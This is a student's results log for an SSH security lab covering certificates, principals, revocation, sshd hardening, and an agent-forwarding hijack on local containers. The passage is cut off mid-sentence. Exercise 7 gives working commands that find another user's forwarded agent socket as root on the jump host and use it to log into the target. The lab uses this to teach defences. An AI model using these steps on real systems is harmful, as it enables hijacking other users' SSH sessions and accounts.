# Lab 5 — SSH certificates, authorisation, hardening, agent hijack

Results log. One block per exercise: what was run, what was observed, what it proves,
what goes into Lab report 2. Replace every `_pending_` with the real observation.

Status: **Ex. 1–8 done**, report + reflection pending.

---

## Setup (pre-lab)

- Stack: `~/ssc-lab5` on the VM (`ssc-lab`), user `student`, home `/home/student`.
- CA: `~/.ssh/user_ca` + `user_ca.pub` (one CA, mounted into both containers at
  `/etc/ssh/user_ca.pub`). Created before `docker compose up -d`.
- Identities: `~/.ssh/id_dev`, `~/.ssh/id_ops` (separate keypairs so two certs coexist).
- Snapshot `lab5-clean` taken before edits.

### Incident during setup: `jump` did not resolve

```
$ ssh -J jump -i ~/.ssh/id_dev dev@target
ssh: Could not resolve hostname jump: Temporary failure in name resolution
Connection closed by UNKNOWN port 65535
```

Diagnosis (`ssh -G jump`, read-only):

```
user student
hostname jump          <-- no alias: the name went to DNS
port 22
identityfile ~/.ssh/id_rsa ...
```

`~/.ssh/config` did not exist (`tail: cannot open '/home/student/.ssh/config'`).
Both messages were one failure: the `ProxyJump` child could not resolve `jump`, so the
parent reported the dead proxy as `UNKNOWN port 65535`.

Fix:

```bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
cat > ~/.ssh/config <<'EOF'
Host jump
    HostName 127.0.0.1
    Port 2023
    User dev
    IdentityFile ~/.ssh/id_dev
EOF
chmod 600 ~/.ssh/config
ssh -G jump | grep -Ei '^(hostname|port|user|identityfile)'
```

After: `hostname 127.0.0.1`, `port 2023`, `user dev`,
`identityfile /home/student/.ssh/id_dev`.
`target` is deliberately **absent** from the config: `-J jump` makes jump resolve it on
the compose network.

Report note: worth one line in 1a — the alias, not DNS, is what makes the topology work;
`-i` applies to the destination, so the jump hop needs `IdentityFile` in the config.

---

## P1 — stack up + keys exist

Commands:

```bash
docker compose ps
ls -l ~/.ssh/id_dev.pub ~/.ssh/id_ops.pub
```

Observed:

```
_pending_
```

Artefact: `../reports/images/G05Prep1.png` (existing). Report: paste both outputs.

## P2 — two operational problems of raw keys

Observed: _n/a (prose answer)_

Answer used: (1) key distribution does not scale — every host needs every user's key in
`authorized_keys` (N×M copies), and revocation means editing every host; (2) host identity
is trust-on-first-use — you accept a fingerprint you cannot verify, which is a MITM window
and does not scale either.

---

## Exercise 1 — raw key login through jump

### Result

```
$ ssh -J jump -i ~/.ssh/id_dev dev@target
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

1a097db4c2a2:~$
```

- Landed in `target` (hostname `1a097db4c2a2` = short container id), as `dev`,
  in `/home/dev` (`~`).
- Alpine's default `PS1` carries no `user@host`, so the prompt alone does not prove the
  account; confirmed with `whoami; id; pwd; hostname` (below).
- Two host-key prompts were accepted on the first connection (one for `jump`, one for
  `target`) — the evidence for 1a.

Screenshot for 1a: the two "authenticity of host ... can't be established" prompts
(`_pending_: save as `../reports/images/G05Ex1-hostkeys.png`).

Verify account (run inside that shell):

```bash
whoami; id; pwd; hostname
```

Observed:

```
dev
uid=1001(dev) gid=1001(dev) groups=1001(dev)
/home/dev
1a097db4c2a2
```

Confirms: authenticated as `dev` (uid 1001, only its own group — no sudo/admin group),
`$HOME` is `/home/dev`, and the host reached is the `target` container (`1a097db4c2a2`,
its short container id; `docker compose ps` shows the same prefix under `target`).
Not root, not `student`, and not `jump` — so the `-J` hop really landed on the destination
rather than leaving you on the bastion. Contrast the hop itself (different short id) — **run from the VM, not from inside target**:

```bash
exit                          # if you are still in 1a097db4c2a2:~$, leave target first
ssh jump 'whoami; hostname'
```

Observed:

```
dev
d8a639e4d40d
```

Two different short ids — `target` = `1a097db4c2a2`, `jump` = `d8a639e4d40d` — so the two
names are two distinct sshd processes with two distinct host keys, and `-J` really is a
first login to `jump` followed by a second login to `target`, not a tunnel. `dev` is the
account on both (the stack creates `dev`, `ops`, `student` in each image), which is why the
same `-i`-less hop works with `User dev` from the config.

### Gotcha: `ssh jump` run from *inside* target

```
1a097db4c2a2:~$ ssh jump 'whoami; hostname'
The authenticity of host 'jump (172.18.0.3)' can't be established.
ED25519 key fingerprint is SHA256:hqhUOQ1uHUUrshVNYuPsoiwTVcSE5z8SiruRNV236/c
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'jump' (ED25519) to the list of known hosts.
dev@jump's password:
```

Not a failure of the lab — a different `jump`. Inside `target` there is no
`~/.ssh/config`, so the alias is gone and the name is resolved by Docker's DNS to jump's
container IP `172.18.0.3:22`; with no `IdentityFile`, ssh offers the default `~/.ssh/id_*`,
which `dev` does not have, and falls back to password (`dev` has none: `adduser -D`, then
`passwd -u`). Ctrl-C.

Three things this demonstrates, all reusable in 1a:

| Invocation | Who resolves `jump` | To | Credential |
|---|---|---|---|
| `ssh -J jump ... dev@target` on the VM | VM's `~/.ssh/config` | `127.0.0.1:2023` (published port) | `~/.ssh/id_dev` |
| `ssh -J jump ... dev@target` on the VM | **jump's sshd** resolves `target` | `172.18.0.x:22`, compose network | n/a (destination) |
| `ssh jump` inside `target` | target's resolver → Docker DNS | `172.18.0.3:22` | none → password |

And note the extra host-key prompt: `dev` on `target` keeps its **own** `known_hosts`, so
this was a second, independent blind acceptance of jump's fingerprint — trust-on-first-use
reproducing itself one layer in. Neither `-J` hop nor this one is verified.

### Why it worked (for 1a)

`target` trusted the key because the README command copied `id_dev.pub` into
`/home/dev/.ssh/authorized_keys` out of band — an act of provisioning, per host, per user.
`jump` needed the same, because `-J` is a separate login to jump, not a tunnel. At 100 hosts
× 100 users this is 10 000 copies and a revocation that touches every host. Blind
fingerprint acceptance exposes the first connection to MITM; verification needs an
out-of-band channel per host, so it does not scale. The certificate answer to *this* half is
host certificates (`ssh-keygen -h`, `HostCertificate`, `@cert-authority`) — take-home only,
not marked.

---

## Exercise 2 — issue the dev certificate

Commands:

```bash
ssh-keygen -s ~/.ssh/user_ca -I 'student@lab5' -n dev -z 1 -V +1h ~/.ssh/id_dev.pub
ssh-keygen -Lf ~/.ssh/id_dev-cert.pub
ssh-keygen -lf ~/.ssh/user_ca.pub
```

Observed:

```
Signed user key /home/student/.ssh/id_dev-cert.pub: id "student@lab5" serial 1 for dev valid from 2026-10-21T11:47:00 to 2026-10-21T12:48:04

/home/student/.ssh/id_dev-cert.pub:
        Type: ssh-ed25519-cert-v01@openssh.com user certificate
        Public key: ED25519-CERT SHA256:FFlmbuOG9Dq/IBdVrFj+vrarwqpp/0xxjk+gcp+4Vb0
        Signing CA: ED25519 SHA256:EiNe5euwxL6pbCHJFHdOye6CnE4vtnCyMUkycBmBfvo (using ssh-ed25519)
        Key ID: "student@lab5"
        Serial: 1
        Valid: from 2026-10-21T11:47:00 to 2026-10-21T12:48:04
        Principals:
                dev
        Critical Options: (none)
        Extensions:
                permit-X11-forwarding
                permit-agent-forwarding
                permit-port-forwarding
                permit-pty
                permit-user-rc

256 SHA256:EiNe5euwxL6pbCHJFHdOye6CnE4vtnCyMUkycBmBfvo SSC user CA (ED25519)
```

| Field | Value |
|---|---|
| Type | `ssh-ed25519-cert-v01@openssh.com` user certificate |
| Key ID | `student@lab5` (written to sshd's log on every use) |
| Serial | `1` |
| Principals | `dev` (one) |
| Valid | `2026-10-21T11:47:00` → `2026-10-21T12:48:04` (≈61 min, not exactly 60: the `from` is anchored at the signing second and the expiry carries ssh-keygen's small skew margin) |
| Critical Options | `(none)` |
| Extensions | `permit-X11-forwarding`, `permit-agent-forwarding`, `permit-port-forwarding`, `permit-pty`, `permit-user-rc` |
| Signing CA | `SHA256:EiNe5...Bfvo` = fingerprint of `~/.ssh/user_ca.pub` ✅ **one CA, as required** |

Cross-checks worth recording:

- `Signing CA` fingerprint equals `ssh-keygen -lf ~/.ssh/user_ca.pub` → the single-CA
  invariant holds (a second CA is the classic silent failure: containers trust one,
  your cert is signed by the other, nothing works).
- `Public key` fingerprint should equal `ssh-keygen -lf ~/.ssh/id_dev.pub`
  (`_pending_: paste it) → proves the certificate certifies *this* key pair.
- **Expires 12:48:04 today.** From Ex. 3 the raw key is gone, so this is the only way into
  `target`; re-run the signing command before Ex. 6's auth test and again before Part D.

Report-relevant detail: the `Extensions` list is what lets this certificate be used with
`ssh -A`. `permit-agent-forwarding` is a *certificate* permission, so it can be withheld at
signing time (`-O clear -O permit-pty -O permit-port-forwarding`), i.e. an agent-forwarding
policy that the credential itself enforces even on a host you forgot to configure — a
defence-in-depth line worth one sentence in 8a.

2a: short validity bounds the *window* of misuse and needs no per-host cleanup (expiry is
enforced by every host that trusts the CA). It does not end a live session, does not revoke
early, and cannot distinguish a leaked key from an honest one.

---

## Exercise 3 — target trusts the CA

Commands (target):

```bash
printf '\nTrustedUserCAKeys /etc/ssh/user_ca.pub\n' >> /etc/ssh/sshd_config
rm -f /home/dev/.ssh/authorized_keys
sshd -t && kill -HUP 1
```

Verification (VM):

```bash
docker compose exec -T target sshd -T | grep -i trustedusercakeys
ssh -J jump -i ~/.ssh/id_dev dev@target
```

Observed:

```
$ docker compose exec -T target grep -n TrustedUserCAKeys /etc/ssh/sshd_config
5:#   TrustedUserCAKeys          Exercise 3
12:# TrustedUserCAKeys line in Exercise 3.
33:TrustedUserCAKeys /etc/ssh/user_ca.pub

$ docker compose exec -T target sshd -T | grep -i trustedusercakeys
trustedusercakeys /etc/ssh/user_ca.pub

$ docker compose exec -T target ls -la /home/dev/.ssh/
drwx------  2 dev dev 4096 Oct 21 10:52 .
-rw-r--r--  1 dev dev   86 Oct 21 10:45 known_hosts
drwxr-sr-x  1 dev dev 4096 Oct 14 12:17 ..

$ ssh -J jump -i ~/.ssh/id_dev dev@target
1a097db4c2a2:~$
```

Line 33 vs lines 5 and 12: the two earlier hits are the file's own comments, not directives —
`grep` counts them, `sshd -T` does not. `authorized_keys` is gone, so the successful login can
only have come from the certificate.

Two observations worth a sentence each in the report:

- `/etc/ssh/user_ca.pub` is `-rw-r--r-- ops dev`, **not root**: it is the bind mount of the
  VM's `~/.ssh/user_ca.pub`, so the VM uid 1000 (`student`) appears inside as `ops`, the
  first account the Dockerfile creates. sshd accepts it because it is `644`;
  group/other-writable would be refused. Same ownership trap the README warns about for
  `auth_principals/`, one file over.
- `known_hosts` at 10:45 is residue of the failed `ssh jump` from inside `target` — the extra
  blind fingerprint acceptance seen in the Exercise 1 gotcha.

### Failed first attempt (reload never happened)

```
$ docker compose exec -T target sshd -T | grep -i trustedusercakeys
trustedusercakeys none
$ ssh -J jump -i ~/.ssh/id_dev dev@target        # still worked!
```

The line had not been written (`NO SUCH LINE` in the file) **and** `authorized_keys` was
still present, so the successful login was the raw key from Part A, not the certificate. A
green login here proved nothing about the CA — the one-line version of the file-vs-daemon
gap that Exercise 6 tests at scale. Fixed with a single non-interactive `sh -c` (the earlier
multi-line paste into `docker compose exec target sh` was consumed oddly, and `sshd -t`
fails with `sshd requires execution with an absolute path`).

Certificate evidence (server log while logging in):

```
_pending_   (expect: Accepted certificate ID "student@lab5" (serial 1)
             CA ED25519 SHA256:EiNe5euwxL6pbCHJFHdOye6CnE4vtnCyMUkycBmBfvo)
```

### Gotcha: `sshd` inside the container's interactive shell

```
/ # sshd -t
sshd requires execution with an absolute path
```

OpenSSH refuses to run when `argv[0]` is a bare name (anti-hijack check). The shell execs
`/usr/sbin/sshd` but passes `argv[0]="sshd"`. Use the absolute path:

```bash
/usr/sbin/sshd -t && echo CONFIG-OK
kill -HUP 1
/usr/sbin/sshd -T | grep -i trustedusercakeys
```

Consequence worth noting: `sshd -t` failing short-circuits `&& kill -HUP 1`, so the daemon
keeps the **old** config and silently does not trust the CA — the failure mode looks like a
certificate problem when it is a reload problem. From the VM the handout's
`docker compose exec -T target sshd -T` works, because Docker resolves the path itself.

Also: do not paste a multi-line block starting with `docker compose exec target sh` into the
VM shell — the first line opens the container shell and the remaining lines are interpreted
*inside* it. One line at a time.

### 3a — the implicit rule

```bash
ssh -J jump -i ~/.ssh/id_dev ops@target
```

Client: `ops@target's password:` — the certificate was refused and sshd still offered
`password`, so the client fell back to it; Ctrl-C. (Not `Permission denied`: that arrives only
after Exercise 6 removes the password methods.)

Server log (`docker compose logs -f --tail 0 target` in a second terminal) — both events,
in one log:

```
target  | Accepted publickey for dev from 172.18.0.3 port 39248 ssh2: ED25519-CERT SHA256:FFlmbuOG9Dq/IBdVrFj+vrarwqpp/0xxjk+gcp+4Vb0 ID student@lab5 (serial 1) CA ED25519 SHA256:EiNe5euwxL6pbCHJFHdOye6CnE4vtnCyMUkycBmBfvo
target  | Received disconnect from 172.18.0.3 port 39248:11: disconnected by user
target  | Disconnected from user dev 172.18.0.3 port 39248
target  | Refusing certificate ID "student@lab5" serial=1 signed by ED25519 CA SHA256:EiNe5euwxL6pbCHJFHdOye6CnE4vtnCyMUkycBmBfvo: Certificate invalid: name is not a listed principal
```

The `Accepted` line is the certificate evidence for the whole of Part B in one message: key
type `ED25519-CERT`, key fingerprint, `ID student@lab5`, `serial 1`, and the CA fingerprint —
i.e. target verified a signature by the CA, not a key it had ever seen.

The refusal says `name is not a listed principal`: the requested account is `ops`, the
certificate's only principal is `dev`, and with `AuthorizedPrincipalsFile` unset sshd applies
the implicit rule (principals matched against the target user name) using the same check an
explicit principals file would use. Same certificate, same CA, different account → refused.

Also worth noting for the report: the peer address in both lines is `172.18.0.3` — **jump**,
not the VM. Through `-J`, target can never see the real client address, so its logs cannot
distinguish you from an attacker sitting on jump. That is exactly the position the Part D
attacker occupies.

Client side of the failed attempt: `_pending_` (expect `dev@target: Permission denied
(publickey).` — the client is told nothing about principals).

Answer: with `AuthorizedPrincipalsFile` unset, sshd matches the certificate's principals
against the **requested user name**. `dev` is a principal → `dev@target` works; `ops` is not
→ refused. The client learns nothing; the server log names the layer.

---

## Exercise 4 — authorisation by principals

Commands: added `AuthorizedPrincipalsFile /etc/ssh/auth_principals/%u`; created
`/etc/ssh/auth_principals/{dev,ops}` root-owned inside the container; then on the VM issued
the ops cert (`-n ops -z 2 -V +1h`).

`sshd -T | grep -i authorizedprincipalsfile`:

```
before: authorizedprincipalsfile none
after:  authorizedprincipalsfile /etc/ssh/auth_principals/%u
```

Principals files (numeric owners — uid 1000 inside is `ops`, so names mislead):

```
$ docker compose exec -T target ls -ln /etc/ssh/auth_principals
-rw-r--r--  1 0  0  4  dev
-rw-r--r--  1 0  0  4  ops
```

`0 0` = root-owned, `644`, directory `755`: the ownership sshd demands. A bind mount from the
VM would show `1000` here and sshd would log `bad ownership or modes` and ignore the file.

Second certificate (`ssh-keygen -Lf ~/.ssh/id_ops-cert.pub`):

```
Type: ssh-ed25519-cert-v01@openssh.com user certificate
Public key: ED25519-CERT SHA256:bq3YTE8n8tZHsnS2HooYNwMXYvkLcktkS/XUUgV9Nl4
Signing CA: ED25519 SHA256:EiNe5euwxL6pbCHJFHdOye6CnE4vtnCyMUkycBmBfvo
Key ID: "student-ops"
Serial: 2
Valid: from 2026-10-21T11:55:00 to 2026-10-21T12:56:15
Principals: ops
Critical Options: (none)
Extensions: permit-X11-forwarding, permit-agent-forwarding, permit-port-forwarding,
            permit-pty, permit-user-rc
```

Same CA as the dev cert (`EiNe5...Bfvo`), different principal and serial; both files present:

```
-rw-r--r-- 1 student student 648 11:48 /home/student/.ssh/id_dev-cert.pub
-rw-r--r-- 1 student student 648 11:56 /home/student/.ssh/id_ops-cert.pub
```

Note: the signing command was run twice (11:55, then 11:56). The second run **overwrote**
`id_ops-cert.pub` — harmless here because the principal and serial were identical, but it is
the documented hazard: `-s` writes next to the public key, so a different `-n`/`-z` on a
re-run silently replaces the previous certificate.

Attempts:

| Command | Result | Server log |
|---|---|---|
| `ssh -J jump -i ~/.ssh/id_dev ops@target` | `ops@target's password:` — cert refused, client fell back to password; Ctrl-C | `Refusing certificate ID "student@lab5" serial=1 signed by ED25519 CA SHA256:EiNe5...Bfvo: Certificate does not contain an authorized principal` |
| `ssh -J jump -i ~/.ssh/id_dev dev@target` | login as `dev` | `Accepted publickey for dev ... ID student@lab5 (serial 1)` |
| `ssh -J jump -i ~/.ssh/id_ops ops@target` | login as `ops` | `Accepted publickey for ops ... ID student-ops (serial 2)` |

Two things to draw out in the report:

- **The failure mode is a password prompt, not `Permission denied`.** Before Exercise 6 the
  shipped config still offers `password`/`keyboard-interactive`, so a refused certificate is
  followed by a password attempt. Any password prompt here means "the certificate was
  rejected", and it is the live argument for 6c.
- `/etc/ssh/auth_principals/ops` contains `ops`; the dev certificate's only principal is
  `dev`, so the file refuses it.
- **The two failure messages are not identical**, contrary to the first reading of 3a:

  | Configuration | sshd's reason |
  |---|---|
  | no `AuthorizedPrincipalsFile` (3a) | `Certificate invalid: name is not a listed principal` |
  | `AuthorizedPrincipalsFile` set (4a) | `Certificate does not contain an authorized principal` |

  So the log does reveal *which mechanism* refused — but not *what the policy says*. Only
  `sshd -T | grep authorizedprincipalsfile` shows the policy in force.

Full log sequence for the two attempts (jump + target):

```
jump   | Accepted publickey for dev from 172.18.0.1 port 36948 ssh2: ED25519 SHA256:FFlmbuOG9Dq/IBdVrFj+vrarwqpp/0xxjk+gcp+4Vb0
target | Refusing certificate ID "student@lab5" serial=1 signed by ED25519 CA SHA256:EiNe5...Bfvo: Certificate does not contain an authorized principal
jump   | Received disconnect from 172.18.0.1 port 36948:11: disconnected by user
target | Connection closed by authenticating user ops 172.18.0.3 port 39414 [preauth]
target | Received SIGHUP; restarting.
```

Read it as the two layers of Part A and Part B in one screen: `172.18.0.1` (the VM) is
accepted by **jump** with a *raw key* and no certificate; `172.18.0.3` (jump) is then refused
by **target** with the *certificate*. The bastion is still Part A, the destination is Part B.

4b: the **CA** decided who the key speaks for (authentication). The
**`AuthorizedPrincipalsFile`** decided which account that principal may become
(authorisation). Two decisions, two files, two owners.

---

## Exercise 5 — revocation (KRL)

Commands:

```bash
ssh-keygen -k -f ~/revoked_keys ~/.ssh/id_ops-cert.pub
ssh-keygen -Qf ~/revoked_keys ~/.ssh/id_ops-cert.pub
ssh-keygen -Qf ~/revoked_keys ~/.ssh/id_dev-cert.pub
docker cp ~/revoked_keys target:/etc/ssh/revoked_keys
# on target: RevokedKeys /etc/ssh/revoked_keys ; sshd -t ; kill -HUP 1
```

Observed:

```
$ ssh-keygen -k -f ~/revoked_keys ~/.ssh/id_ops-cert.pub
Revoking from /home/student/.ssh/id_ops-cert.pub

$ ssh-keygen -Qf ~/revoked_keys ~/.ssh/id_ops-cert.pub
/home/student/.ssh/id_ops-cert.pub (lab5 ops identity): REVOKED

$ ssh-keygen -Qf ~/revoked_keys ~/.ssh/id_dev-cert.pub
/home/student/.ssh/id_dev-cert.pub (lab5 dev identity): ok

$ docker cp ~/revoked_keys target:/etc/ssh/revoked_keys
Successfully copied 2.05kB to target:/etc/ssh/revoked_keys

$ docker compose exec -T target sshd -T | grep -i revokedkeys
revokedkeys /etc/ssh/revoked_keys
```

`-Qf` naming the key **and** its comment (`(lab5 ops identity)`) is the useful part: the KRL
identifies the revoked credential by its serial + CA, not by filename. `ok` for the dev cert
is the control that proves the KRL is targeted, not a blanket refusal.

Copying the file changed nothing on its own — the `RevokedKeys` line is what made sshd read
it, and `sshd -T` confirms the directive, not just the file's presence.

| Command | Result | Server log |
|---|---|---|
| `ssh -J jump -i ~/.ssh/id_ops ops@target` | `ops@target's password:` — cert refused, then password fallback; Ctrl-C | `Authentication key ED25519-CERT SHA256:bq3YTE8n8tZHsnS2HooYNwMXYvkLcktkS/XUUgV9Nl4 revoked by file /etc/ssh/revoked_keys` |
| `ssh -J jump -i ~/.ssh/id_dev dev@target` | login as `dev` | `Accepted publickey for dev ... ED25519-CERT SHA256:FFlm... ID student@lab5 (serial 1) CA ED25519 SHA256:EiNe5...Bfvo` |

Full sequence:

```
target | Authentication key ED25519-CERT SHA256:bq3YTE8n8tZHsnS2HooYNwMXYvkLcktkS/XUUgV9Nl4 revoked by file /etc/ssh/revoked_keys
target | Connection closed by authenticating user ops 172.18.0.3 port 57630 [preauth]
target | Accepted publickey for dev from 172.18.0.3 port 46974 ssh2: ED25519-CERT SHA256:FFlmbuOG9Dq/IBdVrFj+vrarwqpp/0xxjk+gcp+4Vb0 ID student@lab5 (serial 1) CA ED25519 SHA256:EiNe5...Bfvo
```

Notes for 5a:

- The revocation names the **certificate's key fingerprint** (`bq3YTE...`, the ops cert's public
  key) and the file that refused it — not the CA, and not the serial. Compare with the dev
  line, whose fingerprint and serial 1 are different: one KRL entry, one credential dead,
  the other untouched.
- The client saw only `ops@target's password:`. Revocation, expiry, a wrong principal and an
  absent certificate are **indistinguishable from the client side**; the server log is the
  only place the four separate. That is the client blindness of 3a, now with a fourth cause,
  and it belongs in 5b.
- Server-side ordering matters when you read the log: the refusal precedes
  `Connection closed by authenticating user ops ... [preauth]` — `[preauth]` means sshd never
  created a session, so nothing was authorised, let alone executed.

5b: CA signature = *who it is for* (never lapses on its own); `AuthorizedPrincipalsFile` =
*which account* (local policy, every login); validity = *time* (fixed at issue); KRL =
*this credential, now*. Short lifetimes alone fail because you cannot shorten a credential
already signed, and waiting out the interval is the attacker's win; only revocation acts
immediately on one named credential.

---

## Exercise 6 — hardening sshd (the precedence trap)

Appended as asked, then read the effective config:

```bash
docker compose exec -T target sshd -T | grep -iE \
 -e '^passwordauthentication|^permitrootlogin|^kbdinteractiveauthentication' \
 -e '^pubkeyauthentication|^authenticationmethods'
```

Observed immediately after appending:

```
permitrootlogin prohibit-password
pubkeyauthentication yes
passwordauthentication yes
kbdinteractiveauthentication yes
authenticationmethods publickey
```

Behaviour tests, with four of five lines inert:

```
$ ssh -o PreferredAuthentications=password -J jump dev@target
dev@target: Permission denied (publickey).

$ ssh -J jump -i ~/.ssh/id_dev dev@target
1a097db4c2a2:~$
```

| Appended line | Effective | Status |
|---|---|---|
| `PasswordAuthentication no` | `yes` | **inert** — duplicate of the line at the top |
| `PermitRootLogin no` | `prohibit-password` | **inert** — duplicate |
| `PubkeyAuthentication yes` | `yes` | **inert** — duplicate, value incidentally correct |
| `KbdInteractiveAuthentication no` | `yes` | **inert** — duplicate |
| `AuthenticationMethods publickey` | `publickey` | **obeyed** — only keyword absent earlier |

The password test passed **because of `AuthenticationMethods` alone**, while
`PasswordAuthentication` still reads `yes`: a green test compatible with four inert lines.
The refusal names only `publickey`, so it cannot distinguish "baseline applied" from
"baseline inert except one line".

Cause: the shipped `sshd_config` already sets the first four keywords **above** the appended
block, and sshd takes the **first obtained value** per keyword. `sshd -t` validates syntax
only, so it printed nothing.

### 6a — three counts

| Count | Value | Which |
|---|---|---|
| of the 5 wanted settings, in force | **2 / 5** | `pubkeyauthentication yes` (original line, coincidence), `authenticationmethods publickey` (appended) |
| written/edited lines the daemon obeys | **1 / 5** | `AuthenticationMethods` |
| written/edited lines inert | **4 / 5** | `PasswordAuthentication`, `PermitRootLogin`, `PubkeyAuthentication`, `KbdInteractiveAuthentication` |

Fix (edit the first occurrence, do not append again):

```bash
docker compose exec -T target sh -c '
  sed -i -e "s/^PasswordAuthentication yes/PasswordAuthentication no/" \
         -e "s/^PermitRootLogin prohibit-password/PermitRootLogin no/" \
         -e "s/^KbdInteractiveAuthentication yes/KbdInteractiveAuthentication no/" \
         /etc/ssh/sshd_config
  awk "{ k=\$1; if (k ~ /^(PasswordAuthentication|PubkeyAuthentication|PermitRootLogin|KbdInteractiveAuthentication|AuthenticationMethods)\$/ && seen[k]++) next; print }" \
      /etc/ssh/sshd_config > /tmp/sshd_config.clean && cat /tmp/sshd_config.clean > /etc/ssh/sshd_config
  /usr/sbin/sshd -t && echo CONFIG-OK && kill -HUP 1'
```

The `awk` keeps the **first** occurrence of each of the five keywords and drops later
duplicates — the same rule sshd applies, so file and daemon then agree line for line.

`sshd -T` must be run **inside the container** (`docker compose exec -T target ...`), where it
runs as root. Running the bare `sshd -T` on the VM reads the workstation's own config and fails
with `/etc/ssh/sshd_config.d/50-cloud-init.conf: Permission denied`.

After fix:

```
permitrootlogin no
pubkeyauthentication yes
passwordauthentication no
kbdinteractiveauthentication no
authenticationmethods publickey
```

5/5 settings in force, 4 edited lines obeyed + 1 added, 0 inert.

Prediction (required): appending at the end would have shown the **earlier** values for all
four duplicated keywords and only `AuthenticationMethods` would have taken effect —
justified by sshd_config(5) "the first obtained value will be used", and by the file's own
comment that the defaults are written out explicitly.

Which directive removed password from the list: **`AuthenticationMethods publickey`** — it
defines the allowed set. `PasswordAuthentication no` alone drops `password` but leaves
`keyboard-interactive` (PAM); `KbdInteractiveAuthentication no` drops that; the method list
is the only observable. Why the test proves little: `ssh -o PreferredAuthentications=password`
fails **identically** in the broken and fixed states, so it is compatible with 4/5 lines
inert — including `PermitRootLogin prohibit-password`, which still admits root by
certificate. Only `sshd -T` shows the baseline.

### 6b — ranked

1. `AuthenticationMethods publickey` — closes online password guessing / credential stuffing.
2. `PermitRootLogin no` — removes direct remote root login; a leaked root credential is
   unusable remotely.
3. `KbdInteractiveAuthentication no` — closes the PAM password prompt that survives
   `PasswordAuthentication no`.

`PubkeyAuthentication yes` is the default, not a hardening measure.

### 6c

Leaving `PasswordAuthentication` at its default re-opens a network-reachable
guessing/credential-stuffing path into any account with a password — initial access without
touching the CA, the principals policy, or a key.

Final config saved with:

```bash
docker compose exec -T target cat /etc/ssh/sshd_config > ~/target-sshd_config.final
```

`~/target-sshd_config.final` (verbatim — the report requires the whole file):

```
Port 22

# These are the defaults, written out so that this file and what `sshd -T`
# reports agree before you change anything.
PasswordAuthentication no
PubkeyAuthentication yes
PermitRootLogin no
KbdInteractiveAuthentication no
AuthorizedKeysFile .ssh/authorized_keys

# Needed by Part D (the agent-forwarding hijack, Exercises 7 and 8). Not part of
# the hardening exercises: leave it.
AllowAgentForwarding yes
TrustedUserCAKeys /etc/ssh/user_ca.pub
AuthorizedPrincipalsFile /etc/ssh/auth_principals/%u
RevokedKeys /etc/ssh/revoked_keys
AuthenticationMethods publickey
```

(Header comment block omitted here for length; it is unchanged. In the report, paste the
`cat` output in full.)

Details worth a sentence in the report:

- Each hardening keyword now appears **exactly once**, so file and `sshd -T` agree line for
  line — the property the append attempt did not have.
- The comment above the block still reads *"These are the defaults, written out so that this
  file and what `sshd -T` reports agree"*, now sitting over four **non-default** values.
  Comments document nothing and enforce nothing: the same lesson as the append trap, one
  level up. A reviewer reading only comments would be misled.
- `AllowAgentForwarding yes` is deliberately left in place — Exercise 7/8 needs it, and it is
  the setting the part D hijack abuses; hardening it is not the exercise's answer.

---

## Exercise 7 — agent-forwarding hijack

Re-issued the dev cert first (`-V +1h`), then:

Terminal A:

```bash
eval "$(ssh-agent -s)"
ssh-add ~/.ssh/id_dev
ssh-add -L          # must show the key AND the certificate
ssh -A jump
```

Terminal B is a **new terminal on your own computer** (not in the VM, and not the forwarding
session):

```bash
ssh -p 2222 student@localhost
cd ~/ssc-lab5 && docker compose exec jump sh        # -> / #
```

```bash
find / -name 'id_dev*' -type f 2>/dev/null
SOCK=$(ls -t /home/dev/.ssh/agent/s.* 2>/dev/null | head -1)
[ -z "$SOCK" ] && SOCK=$(ls -t /tmp/ssh-*/agent.* 2>/dev/null | head -1)
echo "$SOCK"
SSH_AUTH_SOCK=$SOCK ssh-add -L
SSH_AUTH_SOCK=$SOCK ssh dev@target
```

Mistake made: the block was first pasted into the **VM** shell, where
`ssh -p 2222 student@localhost` gives `Connection refused` — port 2222 is published on the
macOS host, not inside the VM. The remaining lines then split across two shells and the
hijack did not run at all. Easy to repeat: the attacker side starts from the Mac.

Agent state on the VM, in the correct order (re-sign, **then** add):

```
$ eval "$(ssh-agent -s)"; ssh-add ~/.ssh/id_dev
Agent pid 8846
Identity added: /home/student/.ssh/id_dev (lab5 dev identity)
Certificate added: /home/student/.ssh/id_dev-cert.pub (student@lab5)

$ ssh-add -L
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPNG7THu/CbHBWfd0l1LFxnollQ4EFM5zu+cgFPNlsTo lab5 dev identity
ssh-ed25519-cert-v01@openssh.com AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29t... lab5 dev identity
```

`Certificate added` is the line that matters: add the key before `-s` has produced
`<key>-cert.pub` and the agent holds the bare key, which target refuses with no client-side
clue beyond a password prompt.

`ssh -A jump` then landed on jump (`d8a639e4d40d:~$`) with forwarding live; that session is
what creates the socket, so it must stay open for the whole of the hijack.

Observed — final successful run, one pane, from the VM:

```
$ eval "$(ssh-agent -s)"; ssh-add ~/.ssh/id_dev
Agent pid 9588
Identity added: /home/student/.ssh/id_dev (lab5 dev identity)
Certificate added: /home/student/.ssh/id_dev-cert.pub (student@lab5)

$ ssh -A -f jump 'sleep 3600'
$ pgrep -af 'ssh -A'
9494 ssh -A -f jump sleep 3600
9567 ssh -A jump
9593 ssh -A -f jump sleep 3600

$ docker compose exec jump sh
/ # for s in /home/dev/.ssh/agent/s.*; do
>   if SSH_AUTH_SOCK=$s ssh-add -l >/dev/null 2>&1; then SOCK=$s; break; fi
> done
/ # echo "SOCK=$SOCK"
SOCK=/home/dev/.ssh/agent/s.nhVgl9EQFh.sshd.09omfgoFdf

/ # find / -name 'id_dev*' -type f 2>/dev/null; echo "[find done]"
[find done]

/ # SSH_AUTH_SOCK=$SOCK ssh-add -l
256 SHA256:FFlmbuOG9Dq/IBdVrFj+vrarwqpp/0xxjk+gcp+4Vb0 lab5 dev identity (ED25519)
256 SHA256:FFlmbuOG9Dq/IBdVrFj+vrarwqpp/0xxjk+gcp+4Vb0 lab5 dev identity (ED25519-CERT)

/ # SSH_AUTH_SOCK=$SOCK ssh dev@target
1a097db4c2a2:~$ whoami; hostname
dev
1a097db4c2a2
```

Note the two fingerprints are identical: same key, the second entry has the certificate
